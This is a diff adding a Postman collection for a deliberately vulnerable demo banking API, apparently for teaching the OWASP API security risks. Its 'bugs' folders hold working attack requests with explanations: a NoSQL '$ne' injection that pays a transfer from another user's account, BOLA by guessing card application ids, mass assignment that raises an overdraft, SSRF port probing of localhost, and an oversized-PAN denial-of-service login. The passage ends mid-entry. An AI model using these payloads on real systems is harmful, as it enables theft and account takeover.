@@ -1,0 +1,1645 @@
+{
+	"info": {
+		"_postman_id": "1e70f93c-4a35-4e63-9c6c-e2f7e7cd55e2",
+		"name": "42C Banking",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "17844295"
+	},
+	"item": [
+		{
+			"name": "customer API",
+			"item": [
+				{
+					"name": "Register",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"let response = pm.response.json();",
+									"pm.environment.set(\"AccountId\", response.AccountId);",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"name\": \"{{user1}}\",\n  \"email\": \"{{user1-email}}\",\n  \"postalAddress\": {\n    \"addressLine\": [\n        \"1 Leafy Lane\",\n        \"Hazelbrook\",\n        \"Windy City\"\n    ],\n    \"postCode\": \"AAA111\",\n    \"country\": \"UK\"\n  },\n  \"pan\": \"{{user1-pan}}\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/auth/register",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"auth",
+								"register"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Login",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"let response = pm.response.json();",
+									"pm.environment.set(\"access-token\", response.access);",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/auth/login",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Accounts",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"let response = pm.response.json();",
+									"if(response.accountId) {",
+									"    pm.environment.set(\"AccountId\", response.accountId);",
+									"}",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Account Options",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"let response = pm.response.json();",
+									"if(response.accountId) {",
+									"    pm.environment.set(\"AccountId\", response.accountId);",
+									"}",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"accountType\": \"test\",\n    \"smsNotifications\": true,\n    \"cardActivityAlerts\": false\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Account",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account?email=jbernard@email.com",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account"
+							],
+							"query": [
+								{
+									"key": "email",
+									"value": "jbernard@email.com"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Balances",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/balances",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"balances"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Payee (utility)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"payeeType\": \"utility\",\n    \"name\": \"gas bill\",\n    \"accountNumber\": \"AH800919\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/payees",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"payees"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Payee (contact)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"payeeType\": \"contact\",\n    \"name\": \"James McGuire\",\n    \"iban\": \"IE12BOFI90000112777666\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/payees",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"payees"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Payees",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/payees",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"payees"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Payee",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/payees/6614ed9a2644fd215f65f492",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"payees",
+								"6614ed9a2644fd215f65f492"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Bill Payment",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"name\": \"Electricity company\",\n    \"accountNumber\": \"EC2225554030\",\n    \"amount\": 99\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/payments/bill",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"payments",
+								"bill"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Transfer Payment",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"accountId\": {\"$ne\": \"66d6b2f7256f295c9db2ddb3\"},\n    \"name\": \"Lisa Lovejoy\",\n    \"iban\": \"UK8979879DDDD312349012D1\",\n    \"amount\": 25,\n    \"currency\": \"EUR\",\n    \"description\": \"personal loan\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/payments/transfer",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"payments",
+								"transfer"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Transactions",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/transactions",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"transactions"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Transactions Headers",
+					"request": {
+						"method": "HEAD",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/transactions",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"transactions"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Credit Card Application",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"delivery\": \"collect\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/products/cards",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"products",
+								"cards"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Credit Card Application",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"let response = pm.response.json();",
+									"if(response._id) {",
+									"    pm.environment.set(\"referenceId\", response._id);",
+									"}",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/products/cards/",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"products",
+								"cards",
+								""
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Credit Card Application",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "{{baseURL}}/account/products/cards/{{referenceId}}",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"products",
+								"cards",
+								"{{referenceId}}"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Credit Card Application",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"delivery\": \"post\",\n    \"postalAddress\": {\n        \"addressLine\": [\n            \"8 Elm Grove\",\n            \"Rocky District\",\n            \"Main town\"\n        ],\n        \"postCode\": \"BBB123\",\n        \"country\": \"UK\"\n    }\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/products/cards/{{referenceId}}",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"products",
+								"cards",
+								"{{referenceId}}"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Files",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"https://drive.google.com/file/d/1d6fdCvAmKyIkzuR_AiRyP6p1tSEepl4d\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/files",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"files"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Files",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"url\": \"https://file-examples.com/wp-content/storage/2017/10/file-sample_150kB.pdf\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/files?filename=file-sample_150Kb.pdf",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"files"
+							],
+							"query": [
+								{
+									"key": "filename",
+									"value": "file-sample_150Kb.pdf"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Reserve Meeting",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"schedule\": \"2024-10-01T16:00\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseURL}}/account/products/mortgages/meeting",
+							"host": [
+								"{{baseURL}}"
+							],
+							"path": [
+								"account",
+								"products",
+								"mortgages",
+								"meeting"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "customer API bugs",
+			"item": [
+				{
+					"name": "API 1 (BOLA)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user2-email}}\",\n  \"pan\": \"{{user2-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Credit Card Application",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"delivery\": \"post\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/products/cards",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"products",
+										"cards"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Credit Card Application",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"if(response._id) {",
+											"    pm.environment.set(\"referenceId\", response._id);",
+											"}",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{baseURL}}/account/products/cards/",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"products",
+										"cards",
+										""
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Credit Card Application (own)",
+							"request": {
+								"method": "PUT",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"delivery\": \"collect\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/products/cards/{{referenceId}}",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"products",
+										"cards",
+										"{{referenceId}}"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Credit Card Application (malicious)",
+							"event": [
+								{
+									"listen": "prerequest",
+									"script": {
+										"exec": [
+											"let validId = pm.environment.get(\"referenceId\");",
+											"",
+											"pm.environment.set(\"bola_referenceId\", validId - 1);",
+											"",
+											"",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"method": "PUT",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"delivery\": \"post\",\n    \"postalAddress\": {\n        \"addressLine\": [\n            \"IJntzelaan 27\",\n            \"Mildam\",\n            \"Friesland\"\n        ],\n        \"postCode\": \"8454KV\",\n        \"country\": \"NL\"\n    }\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/products/cards/{{bola_referenceId}}",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"products",
+										"cards",
+										"{{bola_referenceId}}"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "Credit card applications are identified by a referenceId, which is a simple incrementing integer index. This makes it easy to guess the referenceId for other users' credit card applications (1003, 1002, 1001, ...)\n\nA malicious user notices that the API to update a credit card application uses referenceId. By changing the referenceId, they can change the postal address for another users new credit card delivery."
+				},
+				{
+					"name": "API 2 (BrokenAuthN)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								},
+								{
+									"listen": "prerequest",
+									"script": {
+										"exec": [
+											"let randomDigits = Array.from({ length: 10000 }, () => Math.floor(Math.random() * 10)).join('');",
+											"",
+											"pm.environment.set(\"large-pan\", randomDigits);"
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{large-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The login API is vulnerable to denial-of-service attack, targeting the hashing function on the server that is used when validating a user supplied password (or in this case a PAN). The vulnerability at the API level exists because there is no maximum limit enforce on the length of the PAN string.\n\nNote: the hashing function used in the demo app has built in protections against large input value. So don't try to actually create a DOS on your own machine! But you can show that the API is vulnerable, because it accepts very long input strings.\n\n\"certain implementations of hashing algorithms may cause [long password denial of service](https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/).\"\n\nreference: [https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)"
+				},
+				{
+					"name": "API 3 (BOPLA-Mass_Assignment)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Balances",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{baseURL}}/account/balances",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"balances"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Account Options",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"if(response.accountId) {",
+											"    pm.environment.set(\"AccountId\", response.accountId);",
+											"}",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"method": "PUT",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"cardActivityAlerts\": true\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Account Options (hidden)",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"if(response.accountId) {",
+											"    pm.environment.set(\"AccountId\", response.accountId);",
+											"}",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"method": "PUT",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"accountType\": \"Business\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Balances (increased overdraft)",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{baseURL}}/account/balances",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"balances"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The accountType setting can be either 'Personal' or 'Business'. This is a hidden setting and should not be writable by an API client, but it is.\n\nThe accountType sets the overdraft limit for an account. So if a malicious user can change their accountType setting to 'Business', they change their overdraft limit from 500 to 5000!\n\nSo run the Get Balances API request before and after changing the accountType, to see the increased overdraft limit."
+				},
+				{
+					"name": "API 3 (BOPLA-Excessive_Data)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"INVALID\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The API developer has mistakenly added the hashed PAN property in the 401 login response, when a user provides the wrong PAN.\n\nThis means a malicious unauthenticated user can verify if a user has an account by their email address, AND also retrieve the hash of that users PAN."
+				},
+				{
+					"name": "API 4 (Unrestricted Resource Consumption)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Transactions",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{baseURL}}/account/transactions",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"transactions"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The number of transaction records to return should be limited to a mamimum of 5, but the API developer has not enforced the limit."
+				},
+				{
+					"name": "API 6 (Unrestricted Access to Sensitive Business Flows)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Reserve Meeting",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"schedule\": \"2024-10-01T16:00\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/products/mortgages/meeting",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"products",
+										"mortgages",
+										"meeting"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "A user can reserve a timeslot with a mortgage advisor.\n\nThe API doesn't restrict the number of reservations a single user can make, so by changing the \"hour\" value and resending the request, a single malicious user can occupy the entire schedule of a mortgage advisor."
+				},
+				{
+					"name": "API 7 (SSRF)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Files (port 3000)",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"url\": \"http://localhost:3000\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/files",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"files"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Files (port 8080)",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"url\": \"http://localhost:8080\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/files",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"files"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Files (port 8888)",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"url\": \"http://localhost:8888\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/files",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"files"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The API receives a url from the user but does not validate the url.\n\nA malicious user can replace a valid url with a localhost address, and probe the API server to verify open port connections based on the server response (404 vs 500 http).\n\nThe suggested solution is for the API developer to whitelist the allowed domains from which a customer can upload an external file (e.g. google drive only)."
+				},
+				{
+					"name": "API 8 (Security Misconfiguration)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								},
+								{
+									"listen": "prerequest",
+									"script": {
+										"packages": {},
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "OPTIONS",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The Options verb is enabled by default on the server (Express.js in this case).\n\nSince this verb is unused for the login endpoint, it should be explicitly blocked by the API to avoid unexpected behaviors and potential vulnerabilities."
+				},
+				{
+					"name": "API 8:2019 (Injection)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Accounts",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"if(response.accountId) {",
+											"    pm.environment.set(\"AccountId\", response.accountId);",
+											"}",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{baseURL}}/account",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Transfer Payment",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"accountId\": {\"$ne\": \"66daba21d0bc05aa1d335067\"},\n    \"name\": \"Lisa Lovejoy\",\n    \"iban\": \"UK8979879DDDD312349012D1\",\n    \"amount\": 25,\n    \"currency\": \"EUR\",\n    \"description\": \"personal loan\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/payments/transfer",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"payments",
+										"transfer"
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The accountId property of Transfer Payment is vulnerable to noSQL injection. The accountId indicates the users account from which a transfer should be paid.\n\nThe user logs in, and then calls the Get Accounts endpoint to get their own accountId.\n\nThe malicious user then sends a nosql injection value to indicate that the transfer should be paid from an account that \\*does not equal\\* the malicious users accountId.\n\n\"accountId\": {\"$ne\": \"66daba21d0bc05aa1d335067\"}\n\n**Note**: this is also an instance of BOLA, though the focus of the example is to demonstrate nosql injection."
+				},
+				{
+					"name": "A01:2021 (Broken Access Control)",
+					"item": [
+						{
+							"name": "Login",
+							"event": [
+								{
